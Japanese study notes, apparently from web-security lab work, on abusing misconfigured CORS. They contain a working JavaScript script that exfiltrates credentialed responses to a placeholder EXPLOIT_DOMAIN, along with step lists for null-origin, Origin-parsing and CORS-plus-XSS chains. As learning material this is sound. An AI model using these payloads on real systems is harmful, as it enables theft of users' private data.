##### CORSの設定不備を悪用した情報窃取スクリプト

```js
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://TARGET_NET/[機密情報を返すエンドポイント]',true);
	req.withCredentials = true;
	req.send();
	
	function reqListener() {
	   location='https://EXPLOIT_DOMAIN/log?key='+this.responseText;
	};
</script>
```

###### スクリプトの解説

- [XHR](https://developer.mozilla.org/ja/docs/Web/API/XMLHttpRequest)
- `onload`: ページが読み込まれたときに指定したJSを実行する
- `open('method', 'url', 'async')`: 新しく作成されたリクエストを初期化したり、既存のリクエストを再初期化する。`async`は操作が非同期的に行われるかどうかを示す
- `withCredentials`: ACACがtrueなのでtrueに設定
- `send()`: `open()`で指定したURLにリクエストする
- `location=~?key='+this.responseText;`: レスポンスの本文を攻撃者のサーバのアクセスlogページにkeyパラメタの値として送り、遷移する

## シンプルなCORS設定の不備

### クライアント指定のOriginヘッダからACAOを生成する

###### 基本原理と具体例

- クライアントが指定したOriginヘッダの値でサーバがACAOヘッダを生成するので、結局どのドメインからのクロスドメインリクエストでもJavaScriptからのリソースへのアクセスを許可してしまう

- リクエスト
```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://anything
Cookie: sessionid=...
```
- レスポンス
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://anything
Access-Control-Allow-Credentials: true
...
```

#### ステップ

1. 攻撃者のアカウントでログインし、機密情報を返すレスポンスを探す。
2. 機密情報を返すレスポンスにACAC(Credential)ヘッダが指定されているか？
3. `Origin: http://ANYTHING`とし、ACAOヘッダに反映されるか？

4. [4. CORS設定の不備による脆弱性とその悪用](4.%20CORS設定の不備による脆弱性とその悪用.md#CORSの設定不備を悪用した情報窃取スクリプト)をエクスプロイトサーバでホストし、被害者にDeliverする

---
### nullをOriginのホワイトリストに指定している

###### Originの値にnullが指定されるケース

- クロスオリジンのリダイレクト
	- `http://example.com`にアクセスしていたが、そこから自動的に`https://another-domain.com`へリダイレクトするなど

- シリアライズされたデータからのリクエスト
	- ウデータをシリアライズしてローカルに保存し、後でそれをデシリアライズして新たなリクエストを生成する場合、同じオリジンからのリクエストであっても、ブラウザは`Origin`ヘッダーに`null`をセットする
	- [📕](../../Misc/📕.md#シリアライズ・デシリアライズ)

- `file:`プロトコルを使用したリクエスト
- サンドボックス化されたクロスオリジンリクエスト
	- `iframe`タグで`sandbox`属性を使用し、特定の権限を制限した状態でクロスオリジンコンテンツを埋め込んだ場合など

###### なぜnullを許可するのか

- アプリケーションが開発段階にある時、開発者は多くの場合、ローカル環境で作業をする
- ローカルファイルシステムからのリクエスト（`file://`プロトコルを使用）や一部の特殊なデバッグシナリオではブラウザは通常、`Origin`ヘッダに`null`を設定するから

#### ステップ

1. 攻撃者のアカウントでログインし、機密情報を返すレスポンスを探す
2. 機密情報を返すレスポンスにACACヘッダが指定されているか？
3. `Origin: null`とし、ACAOに反映されるか確かめる
4. [4. CORS設定の不備による脆弱性とその悪用](4.%20CORS設定の不備による脆弱性とその悪用.md#CORSの設定不備を悪用した情報窃取スクリプト)を以下の`iframe`タグの`src`要素で使用し攻撃者のサーバにホストし、被害者にDeliver
```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
...
</script>" width='2000px' height='1000px'></iframe>
```

## CORS ✖︎ XSS

- 本来のサブドメインがOriginに指定されている
- そのサブドメインがXSSに脆弱
- →サブドメインを通して機密情報を窃取できる

#### Originヘッダの解析エラーがあるか

- 前方一致の場合
```http
Origin: http://[正当なオリジン].ANYTHING
```
- 後方一致の場合
```http
Origin: http://ANYTHING.[正当なオリジン]
```

###### 解析エラーが起きる原因

- ホワイトリストのOriginとリクエストのOriginを比較し、許可されたものであればACAOヘッダに反映する
- 正規のドメインのサブドメインからのアクセスを許可するために、接頭辞や接尾辞、正規表現で信頼するドメインか判断する

---
#### 基本：CORSの信頼関係を悪用したXSS

1. 攻撃者のアカウントでログインし、機密情報を返すレスポンスを探す
2. 機密情報を返すレスポンスにACACヘッダが指定されているか？
3. [4. CORS設定の不備による脆弱性とその悪用](4.%20CORS設定の不備による脆弱性とその悪用.md#Originヘッダの解析エラーがあるか)
4. ターゲットのWebサイトがACAOに指定しているドメインを発見する(サブドメインなど)
5. 該当ドメインにXSS脆弱性はあるか？
	- [4. XSS contexts](../XSS/4.%20XSS%20contexts.md)

6. XSSが可能なコンテキストで[4. CORS設定の不備による脆弱性とその悪用](4.%20CORS設定の不備による脆弱性とその悪用.md#CORSの設定不備を悪用した情報窃取スクリプト)を==1行にして==埋め込み実行する(**⚠️**：`<script>~</script>`全体をHackvertorでurlencodeすること)

```
https://subdomain.vulnerable-website.com/?xss=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET_NET/[機密情報を返すエンドポイント]',true); req.withCredentials = true; req.send(); function reqListener() {location='https://EXPLOIT_DOMAIN/log?key='+this.responseText;};</script>

### 実践：CORSの設定不備を悪用しXSSでTLSを破る

- ターゲットのWebサイトがHTTPSしか許可していなくても、「HTTPを使用可能な他のドメインを信頼」していると、この攻撃が可能。
- たとえターゲットのWebサイト自体にHTTPのエンドポイントが存在せず、すべてのCookieがSecure(`https`のみ)でも有効
###### 手順

1. 攻撃者のアカウントでログインし、機密情報を返すレスポンスを探す
2. 機密情報を返すレスポンスにACACヘッダが指定されているか？
3. [4. CORS設定の不備による脆弱性とその悪用](4.%20CORS設定の不備による脆弱性とその悪用.md#Originヘッダの解析エラーがあるか)
4. `Origin: http://~`とし、*http*でもACAOに反映されるか？
5. サブドメインへリクエストを出す機能を探し、httpに変更しても問題ないか？
- 例：
```
https://stock.TARGET_NET/?productId=1&storeId=1
```
	↓
```
http://stock.TARGET_NET/?productId=1&storeId=1
```

6. XSSの脆弱性を確認するためにコンテキストを意識して`alert`を実行する
```
http://stock.TARGET_NET/?productId=1<script>alert(1);</script>&storeId=1
```

7. [4. CORS設定の不備による脆弱性とその悪用](4.%20CORS設定の不備による脆弱性とその悪用.md#CORSの設定不備を悪用した情報窃取スクリプト)を1行にしてステップ6の`alert(1)`の箇所に埋め込んだURLを読み取らせるスクリプトをエクスプロイトサーバにホストしView。logに自身の機密情報が表示されていることを確認する

	document.location="http://stock.TARGET_net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET_NET',true); req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT_DOMAIN/log?key='%2bthis.responseText; };%3c/script>&storeId=1"

```

8. 被害者にDeliver。logページから機密情報を確認
